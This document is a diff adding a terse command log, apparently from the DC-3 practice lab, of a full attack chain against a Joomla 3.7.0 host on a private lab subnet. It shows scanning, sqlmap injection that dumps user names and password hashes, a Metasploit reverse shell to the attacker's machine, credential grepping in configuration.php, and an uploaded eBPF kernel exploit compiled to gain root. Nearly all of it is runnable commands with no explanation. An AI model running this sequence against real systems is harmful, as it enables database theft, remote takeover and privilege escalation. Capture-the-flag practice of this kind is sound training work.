@@ -1,0 +1,54 @@
+sudo nmap -sN 192.168.56.0/24
+gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
+http://192.168.56.105/administrator/
+joomscan -u 192.168.56.105
+searchsploit joomscan 3.7.0 & searchsploit -m php/webapps/42033.txt
+sqlmap -u 'http://192.168.56.105/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent --dbs -p 'list[fullordering]'
+sqlmap -u 'http://192.168.56.105/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent -D joomladb --tables
+sqlmap -u 'http://192.168.56.105/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump
+msfconsole
+search joomla 3.7.0
+use 0
+set RHOSTS 192.168.56.105
+set LHOST 192.168.56.107
+set LPORT 4444
+runs
+shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+cd ..
+www-data@DC-3:/var/www/html$ ls -la
+ls -la
+cat configuration.php
+grep -E "user|password|db|host" configuration.php
+uname -r
+uname -m
+cat /etc/os-release
+upload -r /home/kali/Desktop/39772/ebpf_mapfd_doubleput_exploit /tmp
+shell
+cd /tmp/ebpf_mapfd_doubleput_exploit
+ls -la
+uname -r
+uname -m
+cat /etc/os-release
+in meterpeter type this upload -r /home/kali/Desktop/39772/ebpf_mapfd_doubleput_exploit /tmp
+cd /tmp
+ls -la
+chmod +x compile.sh
+chmod +x doubleput.c             
+./compile.sh
+./doubleput
+whoami
+root
+cd /root
+ls -la
+
+
+
+
+
+in a separte kali terminal 
+ls -la ~/Desktop
+cd /home/kali/Desktop/39772
+ls -la
+file /home/kali/Desktop/39772/exploit.tar
+tar -tf /home/kali/Desktop/39772/exploit.tar
